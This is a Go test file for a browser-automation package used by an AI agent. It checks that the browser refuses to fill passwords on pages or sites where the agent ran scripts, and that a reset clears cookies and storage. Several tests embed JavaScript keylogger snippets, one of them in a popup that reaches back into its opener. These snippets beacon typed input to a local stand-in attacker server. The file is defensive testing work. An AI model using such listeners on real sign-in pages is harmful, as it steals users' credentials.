package browser

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"
)

// What a script the agent ran leaves behind, against a real Chrome (see
// TestARealChromeFillsASecretAndSignsWithAPasskey for how to start one):
//
//	TEANODE_TEST_CHROME=http://127.0.0.1:19222 go test ./internal/browser/
//
// A script runs in the document the page shows when it starts, but the page can
// be replaced meanwhile, and what the script sets up (a window, a handler on
// the site) lives on after its document. So the mark is made after the script
// and is the site's, and a fresh browser is the way to sign in again.

// scriptedSiteWorld is a site, a second site, and a server that stands for a
// site the secret must not reach, all on "localhost" at different ports (which
// makes them different sites).
type scriptedSiteWorld struct {
	test            *testing.T
	ctx             context.Context
	browser         *Browser
	siteAddress     string
	otherAddress    string
	attackerAddress string

	mutex    sync.Mutex
	received []string
}

func (self *scriptedSiteWorld) receivedText() string {
	self.mutex.Lock()
	defer self.mutex.Unlock()
	return strings.Join(self.received, "\n")
}

func portOfAddress(address string) int {
	var port int
	_, _ = fmt.Sscanf(address[strings.LastIndex(address, ":")+1:], "%d", &port)
	return port
}

// startScriptedSiteWorld serves the sign-in page and the home page on both
// sites; handlers say anything else. delay is how long the sign-in page takes
// to arrive.
func startScriptedSiteWorld(test *testing.T, handlers func(world *scriptedSiteWorld, response http.ResponseWriter, request *http.Request) bool, delay time.Duration, timeout time.Duration) *scriptedSiteWorld {
	test.Helper()
	endpoint := os.Getenv("TEANODE_TEST_CHROME")
	if endpoint == "" {
		test.Skip("set TEANODE_TEST_CHROME to a DevTools endpoint to run this")
	}
	world := &scriptedSiteWorld{test: test}
	attacker := httptest.NewServer(http.HandlerFunc(func(response http.ResponseWriter, request *http.Request) {
		body, _ := io.ReadAll(request.Body)
		world.mutex.Lock()
		world.received = append(world.received, request.Method+" "+request.URL.String()+" body="+string(body))
		world.mutex.Unlock()
		response.Header().Set("Content-Type", "text/html")
		_, _ = fmt.Fprint(response, "ok")
	}))
	test.Cleanup(attacker.Close)
	world.attackerAddress = strings.Replace(attacker.URL, "127.0.0.1", "localhost", 1)
	serve := http.HandlerFunc(func(response http.ResponseWriter, request *http.Request) {
		response.Header().Set("Content-Type", "text/html")
		if handlers != nil && handlers(world, response, request) {
			return
		}
		if request.URL.Path == "/login" {
			time.Sleep(delay)
			_, _ = fmt.Fprint(response, scriptTestForm)
			return
		}
		_, _ = fmt.Fprint(response, `<html><body><p>home</p></body></html>`)
	})
	site := httptest.NewServer(serve)
	test.Cleanup(site.Close)
	world.siteAddress = strings.Replace(site.URL, "127.0.0.1", "localhost", 1)
	other := httptest.NewServer(serve)
	test.Cleanup(other.Close)
	world.otherAddress = strings.Replace(other.URL, "127.0.0.1", "localhost", 1)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	test.Cleanup(cancel)
	world.ctx = ctx
	browser, err := Connect(ctx, &Settings{Endpoint: endpoint, AllowPrivate: []string{"localhost"}, ProxyListen: "127.0.0.1:0"})
	if err != nil {
		test.Fatal(err)
	}
	test.Cleanup(func() { _ = browser.Close() })
	browser.guard = func(string) error { return nil }
	world.browser = browser
	return world
}

func (self *scriptedSiteWorld) newPage() *Context {
	self.test.Helper()
	page, err := self.browser.NewContext(self.ctx)
	if err != nil {
		self.test.Fatal(err)
	}
	self.test.Cleanup(func() { _ = page.Close() })
	return page
}

// refOfIn is the ref of the first line of the page's interactive snapshot that
// has the description in it, or zero.
func (self *scriptedSiteWorld) refOfIn(page *Context, description string) int {
	snapshot, err := page.Snapshot(self.ctx, "interactive", 0)
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(snapshot.Text, "\n") {
		var ref int
		if strings.Contains(line, description) {
			if _, err := fmt.Sscanf(strings.TrimSpace(line), "[ref=%d]", &ref); err == nil {
				return ref
			}
		}
	}
	return 0
}

func (self *scriptedSiteWorld) fillPassword(page *Context, address string, text string) error {
	ref := self.refOfIn(page, `input(password)`)
	if ref == 0 {
		// A page that cannot be read cannot be filled either: the refusal
		// of a scripted page comes before the field is looked for.
		ref = 1
	}
	return page.FillSecret(self.ctx, FillRequest{Ref: ref, Host: "localhost", Port: portOfAddress(address), Kind: FieldKindPassword, Text: text})
}

func (self *scriptedSiteWorld) isRefusedAsScripted(err error) bool {
	return err != nil && (strings.Contains(err.Error(), ScriptedSiteWords) || strings.Contains(err.Error(), ScriptedPageWords))
}

// An agent that scripts a page that is about to be replaced by the sign-in page
// has the script run in the sign-in page while the mark is on the old one. The
// mark is made again after the script, so the sign-in page is marked however
// the two pages are related: on the same site, or on another.
func TestARealChromeMarksTheDocumentAScriptRanInWhenThePageIsReplacedMeanwhile(test *testing.T) {
	const secret = "an-invented-password-9"
	for name, isCrossSite := range map[string]bool{"the sign-in page is on the same site": false, "the sign-in page is on another site": true} {
		test.Run(name, func(test *testing.T) {
			var loginAddress string
			world := startScriptedSiteWorld(test, func(world *scriptedSiteWorld, response http.ResponseWriter, request *http.Request) bool {
				if request.URL.Path == "/e" {
					_, _ = fmt.Fprintf(response, `<html><body>hello<script>setTimeout(function(){ location.href='%s/login'; }, 30)</script></body></html>`, loginAddress)
					return true
				}
				return false
			}, 15*time.Millisecond, 5*time.Minute)
			loginAddress = ""
			if isCrossSite {
				loginAddress = world.otherAddress
			}
			listenerForSignInPage := func(portOfSignInPage int) string {
				return fmt.Sprintf(`(function(){ if (location.pathname === '/login' && Number(location.port) === %d) { document.addEventListener('input', function(event){ new Image().src='%s/beacon?p='+encodeURIComponent(event.target.value); }, true); throw new Error('installed'); } return 'waiting'; })()`, portOfSignInPage, world.attackerAddress)
			}
			signInAddress := world.siteAddress
			if isCrossSite {
				signInAddress = world.otherAddress
			}
			attempts, installed := 25, 0
			for attempt := 0; attempt < attempts; attempt++ {
				page := world.newPage()
				if _, err := page.Navigate(world.ctx, world.siteAddress+"/e"); err != nil {
					test.Fatal(err)
				}
				isInstalled := false
				for step := 0; step < 400 && !isInstalled; step++ {
					if _, err := page.Evaluate(world.ctx, listenerForSignInPage(portOfAddress(signInAddress)), 100); err != nil && strings.Contains(err.Error(), "installed") {
						isInstalled = true
					}
				}
				if !isInstalled {
					_ = page.Close()
					continue
				}
				installed++
				err := world.fillPassword(page, signInAddress, secret)
				if !world.isRefusedAsScripted(err) {
					test.Errorf("attempt %d: the sign-in page was filled, or refused with the wrong words: %v", attempt, err)
				}
				time.Sleep(100 * time.Millisecond)
				_ = page.Close()
			}
			if installed == 0 {
				test.Fatal("the script never ran on the sign-in page")
			}
			if received := world.receivedText(); strings.Contains(received, secret) {
				test.Fatalf("the password reached the attacker: %s", received)
			}
			test.Logf("the script ran on the sign-in page in %d of %d attempts", installed, attempts)
		})
	}
}

// A script the agent ran on one page of a site can open a window that stays
// alive and reaches into a sign-in page of the site opened afterwards. A mark on
// the document would not cover it; the mark on the site does, and so does a
// fresh browser, which has no such window.
func TestARealChromeDoesNotFillASiteAWindowTheAgentOpenedCouldReach(test *testing.T) {
	const secret = "an-invented-password-9"
	world := startScriptedSiteWorld(test, nil, 0, 2*time.Minute)
	page := world.newPage()
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/"); err != nil {
		test.Fatal(err)
	}
	popup := `var w = window.open('about:blank'); if (!w) { throw new Error('blocked'); } w.document.write('<script>setInterval(function(){ try { var d = opener.document; if (!d.__x) { d.__x = 1; d.addEventListener("input", function(e){ new Image().src="` + world.attackerAddress + `/beacon?p="+encodeURIComponent(e.target.value) }, true) } } catch(e){} }, 5)<\/script>'); 'opened'`
	// First without a user gesture, the way an evaluate runs.
	opened, err := page.Evaluate(world.ctx, `(function(){`+popup+`})()`, 100)
	test.Logf("evaluate alone: %s %v", opened, err)
	// With a click, which is a user gesture.
	if _, err := page.Evaluate(world.ctx, `document.body.innerHTML='<button id=b>open</button>'; document.getElementById('b').onclick = function(){`+popup+`}; 1`, 100); err != nil {
		test.Fatal(err)
	}
	if _, _, err := page.Click(world.ctx, Target{Ref: world.refOfIn(page, `open`)}); err != nil {
		test.Fatal(err)
	}
	time.Sleep(300 * time.Millisecond)
	// A new document: the sign-in page. Nothing is marked on it, but its site is.
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/login"); err != nil {
		test.Fatal(err)
	}
	err = world.fillPassword(page, world.siteAddress, secret)
	if !world.isRefusedAsScripted(err) {
		test.Fatalf("the sign-in page of a site the agent ran a script on was filled, or refused with the wrong words: %v", err)
	}
	time.Sleep(500 * time.Millisecond)
	if received := world.receivedText(); strings.Contains(received, secret) {
		test.Fatalf("a window the agent opened read the password: %s", received)
	}

	// A fresh browser is the way to sign in: nothing the script made is there.
	if err := page.Reset(world.ctx); err != nil {
		test.Fatal(err)
	}
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/login"); err != nil {
		test.Fatal(err)
	}
	if err := world.fillPassword(page, world.siteAddress, secret); err != nil {
		test.Fatalf("a fresh browser was not filled: %s", err)
	}
	time.Sleep(500 * time.Millisecond)
	if received := world.receivedText(); strings.Contains(received, secret) {
		test.Fatalf("the password reached the attacker from a fresh browser: %s", received)
	}
	if value, _ := page.Evaluate(world.ctx, `document.querySelector('input[type=password]').value`, 100); value != `"`+secret+`"` {
		test.Fatalf("the field of the fresh browser holds %s", value)
	}
}

// A window the site opened (no script of the agent's) is closed before a
// secret is typed, so that nothing but the page is alive while it is.
func TestARealChromeClosesEveryWindowButThePageBeforeAFill(test *testing.T) {
	const secret = "an-invented-password-9"
	world := startScriptedSiteWorld(test, nil, 0, 2*time.Minute)
	page := world.newPage()
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/login"); err != nil {
		test.Fatal(err)
	}
	// The site opens a window when a button is clicked: a click is real input,
	// not a script of the agent's.
	script := `var button = document.createElement('button'); button.id = 'b'; button.textContent = 'open'; button.onclick = function(){ window.open('about:blank'); }; document.body.appendChild(button); 1`
	if _, err := page.Evaluate(world.ctx, script, 100); err != nil {
		test.Fatal(err)
	}
	// Forget that this script counted, to stand for the site's own page.
	page.filled.ForgetPages()
	if _, _, err := page.Click(world.ctx, Target{Ref: world.refOfIn(page, `open`)}); err != nil {
		test.Fatal(err)
	}
	time.Sleep(300 * time.Millisecond)
	others, err := page.otherTargets(world.ctx)
	isOpen := false
	for _, target := range others {
		isOpen = isOpen || target.isWindow()
	}
	if err != nil || !isOpen {
		test.Fatalf("the site's window did not open: %v %v", others, err)
	}
	if err := world.fillPassword(page, world.siteAddress, secret); err != nil {
		test.Fatal(err)
	}
	others, err = page.otherTargets(world.ctx)
	if err != nil {
		test.Fatal(err)
	}
	for _, target := range others {
		if target.isWindow() {
			test.Fatalf("a window is open while a secret was typed: %v", target)
		}
	}
}

// Reset gives the page a new browser context: what the old one held is gone,
// and the page keeps working under the same value.
func TestAResetPageHasNothingFromBefore(test *testing.T) {
	world := startScriptedSiteWorld(test, nil, 0, 2*time.Minute)
	page := world.newPage()
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/"); err != nil {
		test.Fatal(err)
	}
	if _, err := page.Evaluate(world.ctx, `document.cookie = 'session=abc; path=/'; localStorage.setItem('kept', 'yes'); 1`, 100); err != nil {
		test.Fatal(err)
	}
	page.filled.Remember("an-invented-password-9")
	oldSession := page.session()
	if err := page.Reset(world.ctx); err != nil {
		test.Fatal(err)
	}
	if page.session() == oldSession {
		test.Fatal("the page is still the old one")
	}
	if page.filled.IsOriginScripted(world.siteAddress) || page.filled.HasBeenScripted("") {
		test.Fatal("the fresh browser is taken to be scripted")
	}
	if page.filled.Scrub("an-invented-password-9") == "an-invented-password-9" {
		test.Fatal("a value that was hidden is shown after a reset")
	}
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/"); err != nil {
		test.Fatal(err)
	}
	if value, err := page.Evaluate(world.ctx, `document.cookie + '|' + localStorage.getItem('kept')`, 100); err != nil || value != `"|null"` {
		test.Fatalf("the fresh browser holds what the old one did: %q %v", value, err)
	}
	// And it is a page like any other: a script on it marks its site again.
	if err := page.Reset(world.ctx); err != nil {
		test.Fatal(err)
	}
	if _, err := page.Navigate(world.ctx, world.siteAddress+"/login"); err != nil {
		test.Fatal(err)
	}
	if _, err := page.Evaluate(world.ctx, `1`, 100); err != nil {
		test.Fatal(err)
	}
	if err := world.fillPassword(page, world.siteAddress, "an-invented-password-9"); !world.isRefusedAsScripted(err) {
		test.Fatalf("a script on the reset page did not mark its site: %v", err)
	}
}
